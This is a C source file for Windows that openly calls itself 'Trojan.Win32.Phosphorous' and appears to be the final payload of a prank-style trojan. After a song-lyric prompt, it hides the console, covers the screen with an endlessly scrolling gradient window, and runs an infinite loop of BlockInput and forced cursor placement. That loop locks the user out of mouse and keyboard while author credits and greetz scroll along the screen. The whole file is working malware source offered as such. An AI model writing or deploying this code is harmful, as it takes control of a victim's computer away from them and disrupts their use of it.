//PhosphorousExplorer -- Phosphorus "Gradient" Explorer Overwrite 
//Prettyfied version of PhosphorGR

#include "p15explorer.h"

VOID MakeBorderless(HWND hWindow) {
	RECT wndRect;
	GetWindowRect(hWindow, &wndRect);
	DWORD dwStyle = GetWindowLongW(hWindow, GWL_STYLE);
	dwStyle &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZE | WS_MAXIMIZE | WS_SYSMENU);
	SetWindowLongW(hWindow, GWL_STYLE, dwStyle);
	LONG dwExtendedStyle = GetWindowLongW(hWindow, GWL_EXSTYLE);
	dwExtendedStyle &= ~(WS_EX_DLGMODALFRAME | WS_EX_CLIENTEDGE | WS_EX_STATICEDGE);
	SetWindowLongW(hWindow, GWL_EXSTYLE, dwExtendedStyle);
	SetWindowPos(hWindow, NULL, wndRect.left, wndRect.top, wndRect.right, wndRect.bottom, SWP_FRAMECHANGED | SWP_NOZORDER | SWP_NOOWNERZORDER);
}

VOID ScrollTriangleRepeatRectangle(HDC hDC, COLORREF dwStartColour, COLORREF dwEndColour, RECT Rectangle, DWORD dwOffset) {
	//declare shit
	COLORREF dwCurrentStart = dwStartColour, dwCurrentEnd = dwEndColour;;
	TRIVERTEX lpTrivertex[2];
	GRADIENT_RECT gradientRect = { 0,1 };
	DWORD dwSingleSegmentY, dwRemainder, dwNumberOfSegments = 0;
	INT16 iTempRGB[3];
	BOOLEAN bTriangleRepeatFlipped = 1;
	//DWORD dwTrueOffset;

	//calculate lengths
	iTempRGB[0] = GetRValue(dwStartColour) - GetRValue(dwEndColour);
	if (iTempRGB[0] < 1) iTempRGB[0] /= -1;
	iTempRGB[1] = GetGValue(dwStartColour) - GetGValue(dwEndColour);
	if (iTempRGB[1] < 1) iTempRGB[1] /= -1;
	iTempRGB[2] = GetBValue(dwStartColour) - GetBValue(dwEndColour);
	if (iTempRGB[2] < 1) iTempRGB[2] /= -1;
	if (iTempRGB[0] >= iTempRGB[1] && iTempRGB[0] >= iTempRGB[2]) dwSingleSegmentY = iTempRGB[0];
	else if (iTempRGB[1] >= iTempRGB[0] && iTempRGB[1] >= iTempRGB[2]) dwSingleSegmentY = iTempRGB[1];
	else dwSingleSegmentY = iTempRGB[2];
	//dwTrueOffset = dwOffset;// % (dwSingleSegmentY * 2);

	dwNumberOfSegments = (Rectangle.bottom - Rectangle.top) / dwSingleSegmentY;
	dwRemainder = (Rectangle.bottom - Rectangle.top) % dwSingleSegmentY;

	//initialise vertices, lpTrivertex[0] = Start  lpTrivertex[1] = End
	lpTrivertex[0].Alpha = lpTrivertex[1].Alpha = 0xFFFF;
	lpTrivertex[0].Red = GetRValue(dwStartColour) << 8;
	lpTrivertex[0].Green = GetGValue(dwStartColour) << 8;
	lpTrivertex[0].Blue = GetBValue(dwStartColour) << 8;
	lpTrivertex[1].Red = GetRValue(dwEndColour) << 8;
	lpTrivertex[1].Green = GetGValue(dwEndColour) << 8;
	lpTrivertex[1].Blue = GetBValue(dwEndColour) << 8;
	lpTrivertex[0].x = Rectangle.left;
	lpTrivertex[0].y = Rectangle.top + dwOffset; //account for offset
	lpTrivertex[1].x = Rectangle.right;
	lpTrivertex[1].y = lpTrivertex[0].y + dwSingleSegmentY;

	//draw segments
	for (DWORD dwCurrentSegment = 1; dwCurrentSegment <= dwNumberOfSegments; dwCurrentSegment++) {
		GdiGradientFill(hDC, lpTrivertex, 2, &gradientRect, 1, GRADIENT_FILL_RECT_V);
		//set up vertices for next iteration
		lpTrivertex[0].y = lpTrivertex[1].y;
		lpTrivertex[1].y += dwSingleSegmentY;
		//Triangle repeat colours
		if (bTriangleRepeatFlipped) {
			dwCurrentStart = dwEndColour;
			dwCurrentEnd = dwStartColour;
			bTriangleRepeatFlipped = 0;
		}
		else {
			dwCurrentStart = dwStartColour;
			dwCurrentEnd = dwEndColour;
			bTriangleRepeatFlipped = 1;
		}
		lpTrivertex[0].Red = GetRValue(dwCurrentStart) << 8;
		lpTrivertex[0].Green = GetGValue(dwCurrentStart) << 8;
		lpTrivertex[0].Blue = GetBValue(dwCurrentStart) << 8;

		lpTrivertex[1].Red = GetRValue(dwCurrentEnd) << 8;
		lpTrivertex[1].Green = GetGValue(dwCurrentEnd) << 8;
		lpTrivertex[1].Blue = GetBValue(dwCurrentEnd) << 8;
	}

	//draw segment remainder
	lpTrivertex[1].y = lpTrivertex[0].y + dwRemainder;
	lpTrivertex[1].Green = 120 << 8;
	GdiGradientFill(hDC, lpTrivertex, 2, &gradientRect, 1, GRADIENT_FILL_RECT_V);
	//draw offset remainder

	dwCurrentStart = dwEndColour;
	dwCurrentEnd = dwStartColour;
	lpTrivertex[0].Red = GetRValue(dwCurrentStart) << 8;
	lpTrivertex[0].Green = GetGValue(dwCurrentStart) << 8;
	lpTrivertex[0].Blue = GetBValue(dwCurrentStart) << 8;
	lpTrivertex[1].Red = GetRValue(dwCurrentEnd) << 8;
	lpTrivertex[1].Green = GetGValue(dwCurrentEnd) << 8;
	lpTrivertex[1].Blue = GetBValue(dwCurrentEnd) << 8;
	lpTrivertex[1].y = Rectangle.top + dwOffset;
	lpTrivertex[0].y = lpTrivertex[1].y - dwSingleSegmentY;
	GdiGradientFill(hDC, lpTrivertex, 2, &gradientRect, 1, GRADIENT_FILL_RECT_V);

	dwCurrentStart = dwStartColour;
	dwCurrentEnd = dwEndColour;
	lpTrivertex[1].y = lpTrivertex[0].y;
	lpTrivertex[1].y -= dwSingleSegmentY;
	lpTrivertex[1].Red = GetRValue(dwCurrentStart) << 8;
	lpTrivertex[1].Green = GetGValue(dwCurrentStart) << 8;
	lpTrivertex[1].Blue = GetBValue(dwCurrentStart) << 8;
	lpTrivertex[0].Red = GetRValue(dwCurrentEnd) << 8;
	lpTrivertex[0].Green = GetGValue(dwCurrentEnd) << 8;
	lpTrivertex[0].Blue = GetBValue(dwCurrentEnd) << 8;
	GdiGradientFill(hDC, lpTrivertex, 2, &gradientRect, 1, GRADIENT_FILL_RECT_V);

}

DWORD WINAPI DoBlockInput(LPVOID lpParam) {
	RECT Rect;
	GetWindowRect(GetDesktopWindow(), &Rect);
	for (;;) {
		BlockInput(1);
		SetCursorPos(Rect.right, Rect.bottom);
	}
	
}

DWORD WINAPI TrglRect(LPVOID lpParam) {
	HWND hWindow = CreateWindowExW(0, L"STATIC", L"PhosphorGR Scrolling Gradient", WS_VISIBLE | WS_DLGFRAME, 0, 0, 1920, 1080 - 16, GetDesktopWindow(), NULL, GetModuleHandleW(NULL), NULL);
	MakeBorderless(hWindow);
	ShowWindow(GetConsoleWindow(), 0);
	Sleep(100);
	RECT Screensize;
	GetWindowRect(GetDesktopWindow(), &Screensize);
	HDC hDC = GetDC(hWindow);
	for(;;) for (UINT16 uCtr = 0; uCtr <= 400; uCtr++) {
		ScrollTriangleRepeatRectangle(hDC, RGB(0, 0, 255), RGB(0, 200, 255), Screensize, uCtr);
		Sleep(10);
	}
}

VOID main(){
	
	//If it is the only instance of this application:
	lputsW(L"All I ever wanted\nAll I ever needed\nIs here in my arms\nWords are very unnecessary\nThey can only do harm\n\nPress enter to continue...");
	WaitForConsoleInput();	
	ShowWindow(GetConsoleWindow(), 0);

	HDC hScreen = GetDC(NULL);
	RECT Screensize;
	HANDLE hTrect = CreateThread(NULL, 0, TrglRect, NULL, CREATE_SUSPENDED, NULL),
	hKillInput = CreateThread(NULL, 0, DoBlockInput, NULL, 0, NULL);

	GetWindowRect(GetDesktopWindow(), &Screensize);
	
	SetThreadPriority(hKillInput, THREAD_PRIORITY_BELOW_NORMAL);
	Screensize.top = Screensize.bottom - 16;
	HANDLE hFillrectBrush = CreateSolidBrush(RGB(0, 157, 255));
	FillRect(hScreen, &Screensize, hFillrectBrush);
	DeleteObject(hFillrectBrush);
	
	static const LPCWSTR lpText1 = L"  Welcome to Trojan.Win32.Phosphorous, made by NullException.";
	static const LPCWSTR lpText2 = L"  This has been a very long project to work on, and it was worth every second I spent on it";
	static const LPCWSTR lpText3 = L"  I have learned an insane ammount of new things from working on Phosphorous, and have improved massively as a C developer";
	static const LPCWSTR lpText4 = L"  Greetz to Nikitpad, WamWooWam, toxoid49b and others in GAiA, also to Chris for helping me through most of this project, and Wipet";
	DWORD dwCurrentlyDisplaying = 0;
	INT32 iCurrentPos = 0-12*lstrlenW(lpText1);
	ResumeThread(hTrect);
	SetBkColor(hScreen, RGB(0, 157, 255));
	
	for (;;) {
		switch (dwCurrentlyDisplaying){
		case 0:
			TextOutW(hScreen, iCurrentPos, Screensize.top, lpText1, lstrlenW(lpText1));
			iCurrentPos++;
			if (iCurrentPos > Screensize.right) { dwCurrentlyDisplaying++; iCurrentPos = 0 - 12 * lstrlenW(lpText2); }
			break;
		case 1:
			TextOutW(hScreen, iCurrentPos, Screensize.top, lpText2, lstrlenW(lpText2));
			iCurrentPos++;
			if (iCurrentPos > Screensize.right) { dwCurrentlyDisplaying++; iCurrentPos = 0 - 12 * lstrlenW(lpText3); }
			break;
		case 2:
			TextOutW(hScreen, iCurrentPos, Screensize.top, lpText3, lstrlenW(lpText3));
			iCurrentPos++;
			if (iCurrentPos > Screensize.right) { dwCurrentlyDisplaying++; iCurrentPos = 0 - 12 * lstrlenW(lpText4); }
			break;
		case 3:
			TextOutW(hScreen, iCurrentPos, Screensize.top, lpText4, lstrlenW(lpText4));
			iCurrentPos++;
			if (iCurrentPos > Screensize.right) { dwCurrentlyDisplaying = 0; iCurrentPos = 0 - 12 * lstrlenW(lpText1); }
			break;
		}
		Sleep(5);
	}
}
